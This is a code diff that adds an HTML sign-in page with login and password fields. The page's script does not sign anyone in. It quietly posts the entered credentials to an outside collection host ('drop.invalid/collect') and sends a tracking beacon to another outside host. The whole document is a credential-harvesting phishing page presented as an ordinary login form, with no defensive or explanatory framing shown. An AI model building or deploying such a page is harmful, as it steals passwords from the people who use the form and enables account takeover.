@@ -1,0 +1,20 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Sign in</title></head>
+<body>
+  <form id="f" onsubmit="return send(event)">
+    <input name="login" placeholder="Login">
+    <input name="pass" type="password" placeholder="Password">
+    <button>Sign in</button>
+  </form>
+  <script>
+    function send(event) {
+      event.preventDefault();
+      var body = new FormData(document.getElementById("f"));
+      fetch("https://drop.invalid/collect", { method: "POST", body: body });
+      navigator.sendBeacon("https://beacon.invalid/b", "seen");
+      return false;
+    }
+  </script>
+</body>
+</html>
